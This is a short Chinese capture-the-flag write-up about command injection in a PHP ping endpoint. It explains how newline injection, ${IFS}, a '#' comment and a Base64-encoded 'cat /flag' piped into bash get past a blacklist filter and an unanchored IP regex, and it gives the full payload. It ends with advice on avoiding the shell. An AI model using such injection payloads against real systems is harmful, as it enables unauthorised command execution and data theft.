# ping

## 题目简述

后端把用户提交的 `ip` 拼接到 `system('ping -c 4 ' . $ip)` 中。过滤器只删除分号、空格、斜杠和字面量 `flag`，而 IP 正则没有使用 `^...$` 锚定，因此只要输入中包含一个合法 IPv4 子串即可通过校验，最终可构造命令注入。

## 解题过程

页面源码提示访问 `/api.php?source`，其中可以看到过滤与执行逻辑。各限制的绕过方式为：

- `%0a` 经 URL 解码后成为换行符，可结束第一条 shell 命令；
- `${IFS}` 在 shell 中展开为空白字符，避免使用字面空格；
- 将 `cat /flag` 做 Base64 编码，避开 `/` 与 `flag` 的字符串过滤；
- 在合法 IP 前放置 `#`，使 `ping -c 4 #127.0.0.1` 的剩余部分成为注释；未锚定的正则仍能匹配其中的 `127.0.0.1`。

提交以下参数：

```text
ip=#127.0.0.1%0aecho${IFS}Y2F0IC9mbGFnCg==|base64${IFS}-d|bash
```

URL 解码并经过过滤后，shell 实际看到的关键部分相当于：

```bash
ping -c 4 #127.0.0.1
echo Y2F0IC9mbGFnCg== | base64 -d | bash
```

第二行解码为 `cat /flag` 并执行，从响应中读出 flag。前端输入框的格式限制只影响浏览器界面，使用开发者工具或拦截代理即可直接发送请求，不能替代后端校验。

## 方法总结

黑名单式字符删除无法可靠防止命令注入，因为 shell 还提供换行、变量展开、编码和管道等多种等价表示。正确做法是不调用 shell：把经过严格 IP 解析后的值作为独立参数传给进程；同时让正则覆盖整个输入，或直接使用标准 IP 地址解析函数。
